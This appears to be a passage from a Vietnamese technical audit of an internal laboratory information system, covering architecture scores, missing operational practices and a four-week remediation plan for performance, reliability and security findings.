| **RAM cao** | 🟡 `mem_limit` đã đặt cho 4 service ✔. Nhưng OOM-kill lims-api → mất mọi request đang xử lý, không graceful shutdown |
| **Exception bất ngờ** | 🟢 `register_exception_handlers` bắt toàn cục, trả format chuẩn + correlation-id ✔ |

---

## 5. Điểm số kiến trúc

| Hạng mục | Điểm | Nhận xét |
|---|:---:|---|
| **Backend** | **6**/10 | Cấu trúc service/router sạch, tách bạch tốt, exception handling chuẩn. Trừ nặng vì F-01 (async chặn loop) và F-02 (1 worker) — hai lỗi này làm mọi ưu điểm khác vô nghĩa dưới tải |
| **Frontend** | **5**/10 | Design system nhất quán, RBAC ở UI đầy đủ. Nhưng thiếu code-split, thiếu error boundary, race condition trong hook nền tảng, phân trang sai bản chất |
| **Database** | **6**/10 | Migration kỷ luật (30 bản, có advisory lock), audit log bất biến, constraint đầy đủ. Trừ vì thiếu index FK, N+1 phổ biến, pool sai kích cỡ |
| **Security** | **6**/10 | Nền tảng auth rất tốt (rotation, reuse detection, timing equalizer, magic bytes). Trừ nặng vì F-04/F-05 — hai lỗi vô hiệu hoá chính các cơ chế bảo vệ đã xây |
| **Performance** | **3**/10 | Chưa từng đo tải. F-01+F-02+F-03 cộng lại khiến mục tiêu 60 user đồng thời **không đạt được** ở cấu hình hiện tại |
| **Maintainability** | **7**/10 | Điểm sáng nhất: comment tiếng Việt giải thích *lý do*, không phải *cái gì*; tham chiếu điều khoản ISO; service layer rõ ràng. Trừ vì thiếu test và 294 endpoint trong 41 router phẳng |
| **Scalability** | **3**/10 | Stateless ✔ (JWT, không session server) nên *có thể* scale ngang. Nhưng chưa có LB, chưa có health check, pool sai, scheduler mới chỉ có leader-lock chứ chưa tách worker |
| **Production Readiness** | **4**/10 | **Chưa sẵn sàng deploy tuần sau.** Sáu lỗi Critical đều là loại gây sự cố trong ngày đầu vận hành |

**Tổng: 5,0/10** — Nền móng kỹ thuật tốt hơn mức trung bình của dự án nội bộ, nhưng
tầng vận hành (concurrency, pool, backup, giám sát) chưa được xử lý.

---

## 6. Best practice còn thiếu

**Vận hành**
- [ ] Backup tự động + **diễn tập restore**
- [ ] Healthcheck cho lims-api/lims-web + `restart: unless-stopped`
- [ ] Log rotation Docker (`max-size`, `max-file`) — hiện log JSON phình vô hạn
- [ ] Cảnh báo (đĩa, RAM, tỉ lệ 5xx, độ trễ) — có `/metrics` Prometheus nhưng **không ai scrape**
- [ ] Distributed tracing (có correlation-id ✔ nhưng chưa nối OpenTelemetry)
- [ ] Graceful shutdown (chờ request đang chạy xong)
- [ ] Chiến lược rollback / blue-green / canary
- [ ] Runbook sự cố

**Kỹ thuật**
- [ ] Load test (k6/locust) — **chưa từng đo**
- [ ] `pip-audit` + `npm audit` trong CI
- [ ] Quét secret (gitleaks) trong CI
- [ ] CI frontend
- [ ] Test E2E (Playwright)
- [ ] Test IDOR tự động
- [ ] Chaos test (giết Redis/MinIO giữa lúc chạy)
- [ ] PgBouncer
- [ ] Queue thật (Celery/RQ/arq) cho xuất báo cáo & gửi mail
- [ ] Slow query log Postgres (`log_min_duration_statement=500ms`)

**Dữ liệu**
- [ ] Chính sách lưu trữ/xoá dữ liệu (ISO 17025 yêu cầu thời hạn lưu hồ sơ)
- [ ] Job dọn `auth_tokens` hết hạn (index đã có ✔, chưa có job)
- [ ] Job dọn `access_stats` (6.924 dòng và tăng mỗi request)
- [ ] Dedupe file theo checksum

---

## 7. Lộ trình khắc phục 4 tuần

### Tuần 1 — Chặn deploy (bắt buộc xong trước go-live)

| Task | Finding | Ước tính |
|---|---|---|
| Đổi 16 endpoint upload `async def` → `def` | F-01 | 4h |
| `--workers 4 --proxy-headers` + chỉnh pool | F-02, F-03 | 3h |
| nginx chuyển tiếp IP thật + rate limit key theo IP thật | F-04 | 3h |
| Redis `appendonly yes` + `noeviction` | F-05 | 1h |
| Cron backup + **diễn tập restore 1 lần** | F-06 | 4h |
| Healthcheck + `restart: unless-stopped` + log rotation | F-14 | 2h |
| **Load test xác nhận** 60 user (k6) | — | 6h |

> Không hoàn thành Tuần 1 thì **hoãn go-live**. Sáu lỗi này gây sự cố trong ngày đầu.

### Tuần 2 — Ổn định

| Task | Finding | Ước tính |
|---|---|---|
| Error Boundary + màn hình lỗi có correlation-id | F-15 | 3h |
| `useAsync` chống race + AbortController | F-16 | 4h |
| Debounce ô tìm kiếm (50 chỗ) | F-10 | 3h |
| Phân trang server-side cho `DataTable` | F-11 | 8h |
| Index FK (migration m31, CONCURRENTLY) | F-13 | 3h |
| Cache boto3 client | F-18 | 0,5h |
| CI frontend + `pip-audit`/`npm audit`/gitleaks | F-19 | 4h |

### Tuần 3 — Hiệu năng & bảo mật

| Task | Finding | Ước tính |
|---|---|---|
| Code splitting + lazy 53 trang | F-09 | 6h |
| Sửa N+1 (joinedload/selectinload) | F-12 | 8h |
| Chuyển access token sang in-memory | F-07 | 6h |
| Bật Idempotency-Key ở frontend | F-17 | 3h |
| Chuyển secret dev sang `.env` | F-08 | 2h |
| Test IDOR tự động toàn bộ endpoint `/{id}` | §3.1 | 8h |

### Tuần 4 — Bền vững

| Task | Ước tính |
|---|---|
| Queue nền (arq/RQ) cho xuất Excel/PDF + gửi mail | 12h |
| PgBouncer | 4h |
| Prometheus + Grafana + Alertmanager (đĩa, 5xx, p95) | 8h |
| E2E Playwright cho 10 luồng chính | 12h |
| Chaos test (giết Redis/MinIO/Postgres giữa tải) | 6h |
| Runbook + tài liệu DR | 4h |

---

## 8. Ba việc làm ngay hôm nay (nếu chỉ có 1 ngày)

1. **Đổi `async def` → `def` cho 16 endpoint upload** (F-01) — 4 giờ, gỡ được nút thắt lớn nhất
2. **Redis `--appendonly yes --maxmemory-policy noeviction`** (F-05) — 5 phút, bịt lỗ hổng auth
3. **Cron backup + thử restore** (F-06) — 4 giờ, đây là thứ duy nhất không thể sửa sau khi mất dữ liệu
